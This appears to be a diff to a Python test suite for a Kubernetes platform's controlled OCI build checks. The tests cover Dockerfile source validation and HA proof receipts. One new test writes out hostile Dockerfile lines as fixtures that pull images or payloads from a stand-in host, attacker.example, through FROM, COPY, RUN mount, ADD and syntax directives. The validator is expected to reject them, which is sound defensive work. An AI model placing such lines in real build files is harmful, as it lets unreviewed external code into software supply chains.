@@ -972,15 +972,61 @@ class KubernetesPlatformContractTests(unittest.TestCase):
             ):
                 self.reference.controlled_oci_dockerfile(Path("apps/api/Dockerfile"))
 
-    def test_strict_oci_dockerfile_allows_prior_stage_alias(self) -> None:
+    def test_strict_oci_dockerfile_rejects_adjacent_external_sources(self) -> None:
+        lock = json.loads(
+            (ROOT / "platform/oci-proof-mirror.lock.json").read_text(encoding="utf-8")
+        )
+        rust = lock["images"]["build_rust"]
+        debian = lock["images"]["build_debian"]
+        controlled = (
+            f"FROM {rust['local_ref']}@{rust['digest']} AS builder\n"
+            f"FROM {debian['local_ref']}@{debian['digest']} AS runtime\n"
+        )
+        cases = {
+            "continued-from": (
+                controlled
+                + "FROM\\\n attacker.example/unreviewed:latest AS injected\n"
+            ),
+            "external-frontend": (
+                "# syntax=attacker.example/dockerfile:latest\n" + controlled
+            ),
+            "external-copy": (
+                controlled
+                + "COPY --from=attacker.example/payload:latest /payload /payload\n"
+            ),
+            "external-run-mount": (
+                controlled
+                + "RUN --mount=type=bind,from=attacker.example/payload:latest "
+                + "cat /payload\n"
+            ),
+            "deferred-onbuild": controlled + "ONBUILD COPY . /payload\n",
+            "remote-add": controlled + "ADD https://attacker.example/payload /payload\n",
+        }
+        for label, source in cases.items():
+            with self.subTest(label=label), mock.patch.dict(
+                os.environ, {self.reference.OCI_STRICT_ENV: "1"}
+            ), mock.patch.object(
+                self.reference, "_oci_mirror_lock", return_value=lock
+            ), mock.patch.object(
+                self.reference.Path, "read_text", return_value=source
+            ):
+                with self.assertRaises(self.reference.ProofError):
+                    self.reference.controlled_oci_dockerfile(
+                        Path("apps/api/Dockerfile")
+                    )
+
+    def test_strict_oci_dockerfile_accepts_buildkit_stage_whitespace_and_case(
+        self,
+    ) -> None:
         lock = json.loads(
             (ROOT / "platform/oci-proof-mirror.lock.json").read_text(encoding="utf-8")
         )
         rust = lock["images"]["build_rust"]
         debian = lock["images"]["build_debian"]
         source = (
-            f"FROM {rust['local_ref']}@{rust['digest']} AS builder\n"
-            f"FROM {debian['local_ref']}@{debian['digest']} AS runtime\n"
+            f"FROM\v{rust['local_ref']}@{rust['digest']} AS Builder\n"
+            f"FROM\f{debian['local_ref']}@{debian['digest']} AS Runtime\n"
+            "COPY --from=builder /payload /payload\n"
             "FROM builder AS exported-builder\n"
         )
         with mock.patch.dict(
@@ -993,8 +1039,34 @@ class KubernetesPlatformContractTests(unittest.TestCase):
             rewritten = self.reference.controlled_oci_dockerfile(
                 Path("apps/api/Dockerfile")
             )
-        self.assertIn(f"FROM {rust['local_ref']} AS builder", rewritten)
-        self.assertIn(f"FROM {debian['local_ref']} AS runtime", rewritten)
+        self.assertIn(f"FROM\v{rust['local_ref']} AS Builder", rewritten)
+        self.assertIn(f"FROM\f{debian['local_ref']} AS Runtime", rewritten)
+        self.assertIn("COPY --from=builder", rewritten)
+        self.assertIn("FROM builder AS exported-builder", rewritten)
+
+    def test_strict_oci_dockerfile_allows_prior_stage_alias(self) -> None:
+        lock = json.loads(
+            (ROOT / "platform/oci-proof-mirror.lock.json").read_text(encoding="utf-8")
+        )
+        rust = lock["images"]["build_rust"]
+        debian = lock["images"]["build_debian"]
+        source = (
+            f"FROM {rust['local_ref']}@{rust['digest']} AS Builder\n"
+            f"FROM {debian['local_ref']}@{debian['digest']} AS Runtime\n"
+            "FROM builder AS exported-builder\n"
+        )
+        with mock.patch.dict(
+            os.environ, {self.reference.OCI_STRICT_ENV: "1"}
+        ), mock.patch.object(
+            self.reference, "_oci_mirror_lock", return_value=lock
+        ), mock.patch.object(
+            self.reference.Path, "read_text", return_value=source
+        ):
+            rewritten = self.reference.controlled_oci_dockerfile(
+                Path("apps/api/Dockerfile")
+            )
+        self.assertIn(f"FROM {rust['local_ref']} AS Builder", rewritten)
+        self.assertIn(f"FROM {debian['local_ref']} AS Runtime", rewritten)
         self.assertIn("FROM builder AS exported-builder", rewritten)
 
     def test_strict_image_builds_consume_dockerfiles_from_stdin(self) -> None:
@@ -1612,6 +1684,100 @@ class KubernetesPlatformContractTests(unittest.TestCase):
                     self.proof_identity.IdentityError, "strict controlled OCI"
                 ):
                     self.proof_identity._validate_controlled_oci_proof(identity, drifted)
+
+    def test_ha_cached_proof_allows_cluster_local_platform_digests(self) -> None:
+        locked = "sha256:" + "a" * 64
+        image_id = "sha256:" + "b" * 64
+        lock = {
+            "images": {
+                "runtime": {
+                    "canonical": f"registry.example/runtime@{locked}",
+                    "local_ref": "registry.example/runtime:local",
+                    "digest": locked,
+                    "suites": ["ha-recovery"],
+                    "load_into_kind": True,
+                }
+            }
+        }
+        with tempfile.TemporaryDirectory() as tmp:
+            root = Path(tmp)
+            lock_path = root / "platform/oci-proof-mirror.lock.json"
+            lock_path.parent.mkdir(parents=True)
+            lock_bytes = (json.dumps(lock, sort_keys=True) + "\n").encode()
+            lock_path.write_bytes(lock_bytes)
+            lock_sha256 = hashlib.sha256(lock_bytes).hexdigest()
+            runtime_ref = lock["images"]["runtime"]["local_ref"]
+
+            def receipt(cluster: str, platform: str) -> dict[str, object]:
+                node = f"{cluster}-control-plane"
+                image = {
+                    "canonical": lock["images"]["runtime"]["canonical"],
+                    "local_ref": runtime_ref,
+                    "digest_ref": f"{runtime_ref}@{locked}",
+                    "runtime_ref": runtime_ref,
+                    "locked_index_digest": locked,
+                    "image_id": image_id,
+                    "cri_image_id": image_id,
+                    "platform_target_digest": platform,
+                    "nodes": [{
+                        "node": node,
+                        "runtime_ref": runtime_ref,
+                        "image_id": image_id,
+                        "repo_tags": [runtime_ref],
+                        "repo_digests": [],
+                        "selected_repo_digest": None,
+                        "containerd_target_digest": platform,
+                        "platform_evidence_kind": "containerd_target_digest",
+                        "locked_index_digest": locked,
+                        "platform_target_digest": platform,
+                        "cri_image_status_verified": True,
+                    }],
+                }
+                blockade = {
+                    "node": node,
+                    "registries": {
+                        registry: {"ipv4": ["127.0.0.1"], "ipv6": ["::1"]}
+                        for registry in self.proof_identity.BLOCKED_REGISTRIES
+                    },
+                }
+                return {
+                    "status": "pass",
+                    "strict": True,
+                    "lock_sha256": lock_sha256,
+                    "cluster": cluster,
+                    "loaded_count": 1,
+                    "images": {"runtime": image},
+                    "registry_blockades": [blockade],
+                }
+
+            proof = {
+                "primary_cluster": "primary",
+                "restore_cluster": "restore",
+                "oci_controlled_source": {
+                    "strict": True,
+                    "host": {
+                        "status": "pass",
+                        "strict": True,
+                        "lock_sha256": lock_sha256,
+                        "selected_count": 1,
+                        "images": {
+                            "runtime": {
+                                "source": "local-verified",
+                                "image_id": image_id,
+                            }
+                        },
+                        "failures": {},
+                    },
+                    "primary_cluster": receipt("primary", "sha256:" + "c" * 64),
+                    "restore_cluster": receipt("restore", "sha256:" + "d" * 64),
+                },
+            }
+            identity = {
+                "suite": "ha-recovery",
+                "oci_mirror_lock_sha256": lock_sha256,
+            }
+            with mock.patch.object(self.proof_identity, "ROOT", root):
+                self.proof_identity._validate_controlled_oci_proof(identity, proof)
 
     def test_proof_record_rejects_receipt_from_different_checkout(self) -> None:
         identity = {
